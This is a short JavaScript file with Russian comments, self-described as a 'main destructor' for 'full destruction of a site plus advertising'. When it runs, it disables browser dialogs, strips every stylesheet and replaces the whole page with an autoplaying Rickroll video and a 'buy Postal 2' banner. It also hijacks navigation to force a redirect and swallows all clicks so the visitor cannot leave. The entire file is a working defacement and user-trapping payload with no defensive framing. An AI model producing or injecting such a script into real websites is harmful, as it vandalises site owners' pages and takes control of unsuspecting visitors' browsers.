// ==/=============================================================\==
// pfuhecobr.js - ОСНОВНОЙ ДЕСТРУКТОР
// Функция: Полная деструкция сайта + реклама
// ==\=============================================================/==

(function() {
    'use strict';
    
    // --- ЭТАП 1: УНИЧТОЖЕНИЕ ЗАЩИТЫ ---
    window.alert = window.confirm = window.prompt = function(){};
    
    // --- ЭТАП 2: СНОС СТИЛЕЙ ---
    document.querySelectorAll('style,link[rel="stylesheet"]').forEach(e=>e.remove());
    
    // --- ЭТАП 3: ПОЛНАЯ ПЕРЕЗАПИСЬ СТРАНИЦЫ ---
    document.documentElement.innerHTML = `
    <!DOCTYPE html>
    <html>
    <head><title>КУПИ ПОСТАЛ 2</title></head>
    <body style="margin:0;padding:0;overflow:hidden;">
        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" 
                style="position:fixed;top:0;left:0;width:100vw;height:90vh;border:none;">
        </iframe>
        <div style="position:fixed;bottom:0;left:0;width:100vw;height:10vh;
                    background:#ff0;color:#000;font-size:5vh;font-weight:bold;
                    display:flex;justify-content:center;align-items:center;
                    border-top:5px solid #f00;z-index:9999;">
            купить постал 2
            <span style="background:#fff;padding:5px 20px;border-radius:40px;
                         border:3px solid #000;margin-left:20px;">
                &lt;-- купи постал :)
            </span>
        </div>
    </body>
    </html>
    `;
    
    // --- ЭТАП 4: ФИКСАЦИЯ (НЕ ДАТЬ УЙТИ) ---
    history.pushState = history.replaceState = function(){ 
        location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; 
    };
    
    // Запрет кликов
    document.addEventListener('click', e=>{
        e.preventDefault();
        e.stopPropagation();
    }, true);
    
})();
